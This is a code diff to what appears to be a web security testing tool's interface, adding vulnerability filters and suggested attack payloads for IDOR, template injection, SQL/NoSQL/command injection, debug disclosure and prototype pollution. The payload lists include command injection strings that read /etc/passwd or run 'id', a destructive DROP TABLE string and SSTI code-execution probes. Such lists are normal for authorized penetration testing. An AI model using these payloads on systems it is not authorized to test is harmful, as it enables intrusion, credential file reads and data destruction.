@@ -125,6 +125,31 @@
             :class="{ on: activeFlags.has('new') }"
             @click="toggleFlag('new')"
           >new</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeFlags.has('idor') }"
+            @click="toggleFlag('idor')"
+          >idor</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeFlags.has('ssti') }"
+            @click="toggleFlag('ssti')"
+          >ssti</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeFlags.has('injection') }"
+            @click="toggleFlag('injection')"
+          >injection</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeFlags.has('debug') }"
+            @click="toggleFlag('debug')"
+          >debug</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeFlags.has('proto') }"
+            @click="toggleFlag('proto')"
+          >proto</span>
         </div>
         <span class="inv-filter-sep"></span>
         <div class="inv-filter-group">
@@ -169,6 +194,21 @@
             :class="{ on: activeValueTypes.has(ValueType.BOOLEAN) }"
             @click="toggleValueType(ValueType.BOOLEAN)"
           >boolean</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeValueTypes.has(ValueType.TIMESTAMP) }"
+            @click="toggleValueType(ValueType.TIMESTAMP)"
+          >timestamp</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeValueTypes.has(ValueType.IP) }"
+            @click="toggleValueType(ValueType.IP)"
+          >ip</span>
+          <span
+            class="inv-pill"
+            :class="{ on: activeValueTypes.has(ValueType.SERIALIZED) }"
+            @click="toggleValueType(ValueType.SERIALIZED)"
+          >serialized</span>
         </div>
       </div>
 
@@ -919,6 +959,82 @@ const attackHints = computed<AttackHint[]>(() => {
         'admin',
         "\' OR \'1\'=\'1",
         '{"$gt":""}',
+      ],
+    });
+  }
+
+  if (flags.includes(Flag.IDOR)) {
+    hints.push({
+      icon: '🎯',
+      label: 'Insecure Direct Object Reference (IDOR)',
+      desc: 'Parameter contains an authentication-related name with integer value, indicating potential direct object reference. Manipulating the value may grant access to other users\' resources without proper authorization checks.',
+      payloads: [
+        '1', '2', '999', '0',
+        '-1', '9999999',
+        'null',
+        '(empty string)',
+        '../1', '../../admin',
+        '1 OR 1=1',
+      ],
+    });
+  }
+
+  if (flags.includes(Flag.SSTI)) {
+    hints.push({
+      icon: '🧩',
+      label: 'Server-Side Template Injection (SSTI)',
+      desc: 'Parameter name suggests template processing. Insufficient input sanitization may allow template engine exploitation, potentially leading to remote code execution.',
+      payloads: [
+        '{{7*7}}', '${7*7}', '#{7*7}',
+        '{{config}}', '{{request}}',
+        '<%=7*7%>', '<%= system("id") %>',
+        '{%debug%}', '{{"".__class__.__mro__[2].__subclasses__()}}',
+        '${{<%[%\'"\}}}%\\',
+      ],
+    });
+  }
+
+  if (flags.includes(Flag.INJECTION)) {
+    hints.push({
+      icon: '💉',
+      label: 'Injection Vulnerability',
+      desc: 'Parameter name suggests query or command processing. Insufficient input validation may allow SQL injection, NoSQL injection, or command injection attacks.',
+      payloads: [
+        "'; DROP TABLE users; --",
+        '" OR "1"="1',
+        '{"$ne": null}', '{"$gt": ""}',
+        '`id`', '$(whoami)',
+        '&& id', '|| whoami',
+        '; cat /etc/passwd',
+      ],
+    });
+  }
+
+  if (flags.includes(Flag.DEBUG)) {
+    hints.push({
+      icon: '🐛',
+      label: 'Debug Information Disclosure',
+      desc: 'Parameter appears to control debug functionality. Debug modes often expose sensitive system information, stack traces, or internal application state that should not be visible to users.',
+      payloads: [
+        'true', '1', 'on', 'yes',
+        'full', 'verbose', 'all',
+        'debug', 'trace', 'error',
+        '2', '9', '99',
+      ],
+    });
+  }
+
+  if (flags.includes(Flag.PROTO_POLLUTION)) {
+    hints.push({
+      icon: '🦠',
+      label: 'Prototype Pollution',
+      desc: 'Parameter name contains prototype-related keywords. This may allow pollution of JavaScript object prototypes, potentially leading to privilege escalation or denial of service.',
+      payloads: [
+        '{"__proto__":{"polluted":true}}',
+        '{"constructor":{"prototype":{"polluted":true}}}',
+        '__proto__[polluted]=true',
+        'constructor.prototype.polluted=true',
+        '{"__proto__.polluted":"true"}',
       ],
     });
   }
